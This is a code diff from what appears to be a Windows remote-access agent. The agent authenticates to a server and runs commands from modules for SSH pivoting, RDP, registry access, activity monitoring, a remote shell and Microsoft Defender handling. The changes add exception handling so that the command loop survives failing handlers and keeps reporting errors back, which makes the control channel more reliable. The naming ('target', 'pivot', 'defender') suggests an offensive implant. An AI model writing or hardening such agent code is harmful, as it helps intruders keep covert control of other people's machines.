@@ -1150,6 +1150,7 @@ static json::Value network_connections(const json::Value&) {
 // ── Top CPU / Mem: reuse process list sorted by mem_kb ────────────────────
 static json::Value top_mem(const json::Value& p) {
     json::Value all = list_processes(json::Value{});
+    if (!all.obj.count("processes")) return all;   // error passthrough (was: std::out_of_range throw)
     int limit = (int)p["limit"].num(10);
     // Sort descending by mem_kb
     auto& arr = const_cast<json::Array&>(all.obj.at("processes").arr);
@@ -2297,23 +2298,33 @@ static void agent_loop() {
         if (auth_resp["status"].str() != "ok") { closesocket(g_sock); Sleep(5000); continue; }
 
         // ── Dispatch loop ─────────────────────────────────────────────────
+        // Every command is guarded individually: a handler that throws must
+        // NEVER kill this thread — an unhandled throw here left the socket
+        // open with a dead agent, so the server saw a live-but-deaf target
+        // and every relay timed out. The error text is reported back.
         while (true) {
             std::string line = sock_recv_line();
             if (line.empty()) break;
 
-            json::Value msg    = json::parse(line);
-            std::string module = msg["module"].str();
-            const json::Value& payload = msg["payload"];
-
             json::Value result;
-            if      (module == "pivot")    result = ssh_mod::handle(payload);
-            else if (module == "rdp")      result = rdp_mod::handle(payload);
-            else if (module == "registry") result = reg_mod::handle(payload);
-            else if (module == "activity") result = act_mod::handle(payload);
-            else if (module == "notify")    result = notif_mod::handle(payload);
-            else if (module == "shell")     result = shell_mod::handle(payload);
-            else if (module == "defender")  result = defender_mod::handle(payload);
-            else result = json::err_resp("Unknown module: " + module);
+            try {
+                json::Value msg    = json::parse(line);
+                std::string module = msg["module"].str();
+                const json::Value& payload = msg["payload"];
+
+                if      (module == "pivot")    result = ssh_mod::handle(payload);
+                else if (module == "rdp")      result = rdp_mod::handle(payload);
+                else if (module == "registry") result = reg_mod::handle(payload);
+                else if (module == "activity") result = act_mod::handle(payload);
+                else if (module == "notify")    result = notif_mod::handle(payload);
+                else if (module == "shell")     result = shell_mod::handle(payload);
+                else if (module == "defender")  result = defender_mod::handle(payload);
+                else result = json::err_resp("Unknown module: " + module);
+            } catch (const std::exception& e) {
+                result = json::err_resp(std::string("handler threw: ") + e.what());
+            } catch (...) {
+                result = json::err_resp("handler threw non-standard exception");
+            }
 
             if (!sock_send(result)) break;
         }
